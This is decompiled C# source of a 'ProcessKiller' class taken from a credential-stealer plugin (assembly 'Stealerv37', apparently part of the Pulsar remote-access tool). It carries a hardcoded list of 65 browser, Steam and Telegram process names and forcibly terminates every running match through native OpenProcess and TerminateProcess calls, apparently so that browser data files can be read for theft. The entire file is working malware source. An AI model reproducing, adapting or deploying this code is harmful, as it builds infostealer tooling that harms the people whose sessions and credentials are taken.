// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.ProcessKiller
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Helper;

public static class ProcessKiller
{
  public static string[] Targets = new string[65]
  {
    "thunderbird.exe",
    "icedragon.exe",
    "cyberfox.exe",
    "blackhawk.exe",
    "palemoon.exe",
    "ghostery.exe",
    "undetectable.exe",
    "sielo.exe",
    "conkeror.exe",
    "msedge.exe",
    "netscape.exe",
    "seamonkey.exe",
    "slimbrowser.exe",
    "msedge_pwa_launcher.exe",
    "avant.exe",
    "opera.exe",
    "operagx.exe",
    "msedgewebview2.exe",
    "msedgewebview.exe",
    "chromium.exe",
    "slimjet.exe",
    "chrome.exe",
    "browser.exe",
    "vivaldi.exe",
    "brave.exe",
    "edge.exe",
    "microsoft.exe",
    "dragon.exe",
    "torch.exe",
    "mozila.exe",
    "yandex.exe",
    "sputnik.exe",
    "nichrome.exe",
    "msedge_proxy.exe",
    "cocbrowser.exe",
    "uran.exe",
    "msedge_proxy.exe",
    "chromodo.exe",
    "atom.exe",
    "bravebrowser.exe",
    "steam.exe",
    "cryptotab.exe",
    "ghostbrowser.exe",
    "maelstrom.exe",
    "kinza.exe",
    "globus.exe",
    "falkon.exe",
    "elementbrowser.exe",
    "colibri.exe",
    "whale.exe",
    "avastbrowser.exe",
    "ucbrowser.exe",
    "maxthon.exe",
    "blisk.exe",
    "aolshield.exe",
    "baidubrowser.exe",
    "ccleanerbrowser.exe",
    "hola.exe",
    "xvast.exe",
    "kingpin.exe",
    "qqbrowser.exe",
    "private_browsing.exe",
    "chrome_pwa_launcher.exe",
    "chrome_proxy.exe",
    "telegram.exe"
  };
  private const uint PROCESS_QUERY_LIMITED_INFORMATION = 4096 /*0x1000*/;
  private const uint PROCESS_TERMINATE = 1;

  public static void KillerAll()
  {
    string[] targets = ProcessKiller.Targets;
    if (targets == null || targets.Length == 0)
      return;
    HashSet<string> wanted = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    foreach (string str in targets)
    {
      if (!string.IsNullOrWhiteSpace(str))
      {
        string path = str.Trim().Replace("\"", string.Empty);
        try
        {
          path = Path.GetFileName(path);
        }
        catch
        {
        }
        if (!string.IsNullOrEmpty(path))
        {
          wanted.Add(path);
          if (!path.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            wanted.Add(path + ".exe");
          string withoutExtension = Path.GetFileNameWithoutExtension(path);
          if (!string.IsNullOrEmpty(withoutExtension))
            wanted.Add(withoutExtension);
        }
      }
    }
    if (wanted.Count == 0)
      return;
    List<ProcessWindows.ProcInfo> procInfos = ProcessWindows.GetProcInfos();
    if (procInfos == null || procInfos.Count == 0)
      return;
    Parallel.ForEach<ProcessWindows.ProcInfo>((IEnumerable<ProcessWindows.ProcInfo>) procInfos, (Action<ProcessWindows.ProcInfo>) (proc =>
    {
      if (proc == null)
        return;
      try
      {
        string path = (string) null;
        if (!string.IsNullOrEmpty(proc.Path))
        {
          try
          {
            path = Path.GetFileName(proc.Path);
          }
          catch
          {
            path = proc.Path;
          }
        }
        if (string.IsNullOrEmpty(path))
          path = proc.Name ?? string.Empty;
        string str;
        try
        {
          str = Path.GetFileNameWithoutExtension(path);
        }
        catch
        {
          str = path;
        }
        int result;
        if (!wanted.Contains(path) && !wanted.Contains(str) || !int.TryParse(proc.Pid, out result) || result == 0 || result == 4)
          return;
        IntPtr num = IntPtr.Zero;
        try
        {
          num = NativeMethods.OpenProcess(4097U, false, (uint) result);
          if (num == IntPtr.Zero)
          {
            num = NativeMethods.OpenProcess(4096U /*0x1000*/, false, (uint) result);
            if (!(num != IntPtr.Zero))
              return;
            NativeMethods.CloseHandle(num);
            num = NativeMethods.OpenProcess(1U, false, (uint) result);
            if (num == IntPtr.Zero)
              return;
          }
          try
          {
            NativeMethods.TerminateProcess(num, 1U);
          }
          catch
          {
          }
        }
        finally
        {
          try
          {
            if (num != IntPtr.Zero)
              NativeMethods.CloseHandle(num);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }));
  }
}
